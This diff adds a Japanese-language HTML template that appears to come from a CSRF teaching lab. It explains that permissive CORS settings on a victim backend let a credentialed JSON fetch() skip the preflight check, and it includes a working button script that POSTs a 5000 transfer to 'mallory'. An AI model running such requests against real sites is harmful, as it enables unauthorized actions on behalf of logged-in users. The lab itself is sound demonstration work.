@@ -1,0 +1,38 @@
+{% extends "traps/base.html" %} {% block title %}罠③: fetch() による CSRF{% endblock %} {% block content %}
+<h2>罠③: <code>fetch()</code> + <code>credentials:'include'</code></h2>
+<p>
+  Content-Type を <code>application/json</code> にすると本来は CORS プリフライトが 走るが、被害者バックエンドが
+  <code>CORS_ALLOW_ALL_ORIGINS=True</code> + <code>CORS_ALLOW_CREDENTIALS=True</code> で許可しているため通ってしまう。
+</p>
+
+<pre>
+fetch('{{ victim_api_base }}/api/transfer/', {
+  method: 'POST',
+  credentials: 'include',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ to: 'mallory', amount: 5000 }),
+});</pre
+>
+
+<button id="go" style="font-size: 16px; padding: 8px 16px">攻撃を実行</button>
+<pre id="result" style="margin-top: 12px"></pre>
+
+<script>
+  const out = document.getElementById("result");
+  document.getElementById("go").addEventListener("click", async () => {
+    out.textContent = "送信中...";
+    try {
+      const res = await fetch("{{ victim_api_base }}/api/transfer/", {
+        method: "POST",
+        credentials: "include",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ to: "mallory", amount: 5000 }),
+      });
+      const text = await res.text();
+      out.textContent = `HTTP ${res.status}\n${text}`;
+    } catch (e) {
+      out.textContent = "エラー: " + e.message;
+    }
+  });
+</script>
+{% endblock %}
